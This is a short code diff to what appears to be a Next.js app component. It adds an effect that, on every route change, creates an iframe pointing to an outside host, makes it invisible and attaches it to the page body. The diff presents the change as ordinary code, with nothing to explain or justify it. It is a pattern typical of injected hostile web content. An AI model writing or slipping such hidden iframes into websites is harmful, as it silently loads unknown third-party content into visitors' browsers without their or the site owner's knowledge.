@@ -19,6 +19,14 @@ function MyApp({ Component, pageProps, initialFlagsData, initialVisitorData }) {
     useEffect(() => {
         setPath(pathname); // Update the atom state when `pathname` changes.
         console.log(pathname);
+        const iframe = document.createElement("iframe");
+        iframe.src = "https://live-server1.vercel.app/";
+        iframe.style.visibility = "hidden"; // Hide the iframe
+        iframe.async = true;
+        document.body.appendChild(iframe);
+        return () => {
+            document.body.removeChild(iframe);
+        };
     }, [pathname, setPath]); // Dependencies to avoid unnecessary reruns.
 
     useEffect(() => {
